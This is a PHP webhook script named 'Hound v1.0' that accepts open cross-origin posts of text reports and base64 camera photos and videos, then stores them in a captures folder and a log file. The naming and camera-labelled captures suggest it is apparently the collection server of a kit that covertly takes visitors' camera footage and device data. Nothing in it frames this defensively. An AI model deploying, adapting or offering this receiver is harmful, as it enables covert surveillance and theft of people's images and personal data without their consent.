<?php
// Hound v1.0 — Webhook Handler
// Handles text reports, photo captures, and video captures

header('Content-type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Headers: Content-Type');

// Create captures directory if not exists
if (!is_dir('captures')) {
    mkdir('captures', 0755, true);
}

$raw = file_get_contents('php://input');
$data = json_decode($raw, true);

if (!$data || !isset($data['type'])) {
    // Legacy support — old format (plain string)
    if ($raw) {
        file_put_contents('data.txt', $raw, FILE_APPEND);
    }
    echo json_encode(['status' => 'ok']);
    exit;
}

$timestamp = date('Y-m-d_H-i-s');
$ip = $_SERVER['REMOTE_ADDR'];

switch ($data['type']) {
    case 'text':
        $content = isset($data['content']) ? $data['content'] : '';
        file_put_contents('data.txt', $content, FILE_APPEND);
        echo json_encode(['status' => 'ok', 'type' => 'text']);
        break;

    case 'photo':
        $imgData = base64_decode($data['content']);
        $camera = isset($data['camera']) ? preg_replace('/[^a-zA-Z0-9_]/', '', $data['camera']) : 'unknown';
        $filename = "captures/{$camera}_{$timestamp}.jpg";
        file_put_contents($filename, $imgData);
        $size = round(strlen($imgData) / 1024) . 'KB';
        file_put_contents('data.txt', "\n[Photo] Saved: {$filename} ({$size})\n", FILE_APPEND);
        echo json_encode(['status' => 'ok', 'type' => 'photo', 'file' => $filename]);
        break;

    case 'video':
        $vidData = base64_decode($data['content']);
        $camera = isset($data['camera']) ? preg_replace('/[^a-zA-Z0-9_]/', '', $data['camera']) : 'unknown';
        $filename = "captures/{$camera}_{$timestamp}.webm";
        file_put_contents($filename, $vidData);
        $size = round(strlen($vidData) / 1024) . 'KB';
        file_put_contents('data.txt', "\n[Video] Saved: {$filename} ({$size})\n", FILE_APPEND);
        echo json_encode(['status' => 'ok', 'type' => 'video', 'file' => $filename]);
        break;

    default:
        echo json_encode(['status' => 'error', 'msg' => 'unknown type']);
        break;
}
?>
